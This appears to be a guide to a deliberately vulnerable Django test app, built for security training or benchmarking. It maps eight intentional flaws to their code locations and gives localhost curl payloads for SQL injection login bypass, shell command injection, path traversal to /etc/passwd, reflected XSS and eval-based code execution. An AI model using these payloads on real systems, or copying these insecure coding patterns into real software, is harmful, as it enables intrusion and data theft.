# django-app-vuln – Vulnerability locations and exploit steps

This document describes where each intentional vulnerability lives in the `django-app-vuln` project and how to reproduce the insecure behavior. **Do not deploy this app publicly.**

---

## 1. SQL Injection (CWE-89)

- **Location:** `django-app-vuln/app/views.py` – raw SQL with string formatting in:
  - `register()`: INSERT into app_user.
  - `login()`: SELECT from app_user with username, password in WHERE.
  - `get_profile(profile_id)`: SELECT with profile_id in WHERE.
  - `create_profile()`: INSERT into app_profile.
  - `update_profile(profile_id)`: UPDATE app_profile with profile_id, display_name, bio.
  - `search()`: SELECT with q in LIKE.
- **Example (auth bypass):**
  ```bash
  curl -X POST http://localhost:5004/api/auth/login/ \
    -H "Content-Type: application/json" \
    -d '{"username":"admin\" OR \"1\"=\"1","password":"x"}'
  ```
- **Expected insecure behavior:** Authentication bypass or data leakage/modification.

---

## 2. Command Injection (CWE-78)

- **Location:** `django-app-vuln/app/views.py`, function `run_cmd()` – POST `/api/run/`. User-controlled `cmd` passed to `subprocess.getoutput(cmd)`.
- **Example:**
  ```bash
  curl -X POST http://localhost:5004/api/run/ \
    -H "Content-Type: application/json" \
    -d '{"cmd":"id; whoami"}'
  ```
- **Expected insecure behavior:** Arbitrary shell commands executed.

---

## 3. Broken Access Control / IDOR (CWE-639)

- **Location:** `django-app-vuln/app/views.py`, function `get_profile(profile_id)` – GET `/api/profile/<profile_id>/`. No ownership or role check.
- **Example:**
  ```bash
  curl http://localhost:5004/api/profile/1/
  ```
- **Expected insecure behavior:** Any client can read any profile by ID.

---

## 4. Weak auth/session handling (CWE-287 / CWE-384)

- **Location:** `django-app-vuln/config/settings.py` (SECRET_KEY) and `django-app-vuln/app/views.py` – MD5 passwords, session; admin protected only by hardcoded API key.
- **Example:** Use SQLi in login to bypass; or reuse session cookie.
- **Expected insecure behavior:** Session compromise or auth bypass.

---

## 5. Hardcoded secret/credential (CWE-798)

- **Location:** `django-app-vuln/config/settings.py` – `SECRET_KEY`, `ADMIN_API_KEY` hardcoded.
- **Example:**
  ```bash
  curl -H "X-Api-Key: django_admin_key_123" http://localhost:5004/api/admin/users/
  ```
- **Expected insecure behavior:** Admin access or session forgery if source is exposed.

---

## 6. Insecure file upload / path traversal (CWE-434 / CWE-22)

- **Upload:** `django-app-vuln/app/views.py`, function `upload()` – POST `/api/upload/`. Client filename used as-is; no type/size check.
- **Path traversal:** `django-app-vuln/app/views.py`, function `read_file()` – GET `/api/file/?name=...`. `name` joined with UPLOAD_DIR without resolving or ensuring result stays under it.
- **Example (path traversal):**
  ```bash
  curl "http://localhost:5004/api/file/?name=../../../etc/passwd"
  ```
- **Expected insecure behavior:** Read files outside uploads; upload of malicious files.

---

## 7. XSS (CWE-79)

- **Location:** `django-app-vuln/app/views.py`, function `echo()` – GET `/api/echo/?msg=...`. `msg` reflected into HTML with no escaping.
- **Example:**
  ```bash
  curl "http://localhost:5004/api/echo/?msg=<script>alert(1)</script>"
  ```
- **Expected insecure behavior:** Reflected XSS when viewed in a browser.

---

## 8. Unsafe deserialization / eval-like sink (CWE-502 / CWE-94)

- **Pickle:** `django-app-vuln/app/views.py`, function `config_load()` – POST `/api/config/load/`. Request body passed to `pickle.loads(request.body)`.
- **Eval:** `django-app-vuln/app/views.py`, function `do_eval()` – POST `/api/eval/`. User-supplied `expr` passed to `eval(expr)`.
- **Example (eval):**
  ```bash
  curl -X POST http://localhost:5004/api/eval/ \
    -H "Content-Type: application/json" \
    -d '{"expr":"__import__(\"os\").system(\"id\")"}'
  ```
- **Expected insecure behavior:** Remote code execution.

---

**Summary:** Vulnerabilities are in `django-app-vuln/app/views.py` and `django-app-vuln/config/settings.py`. Use only in an isolated environment. Fixes: see the project's `SAFE_VARIANT.md`.
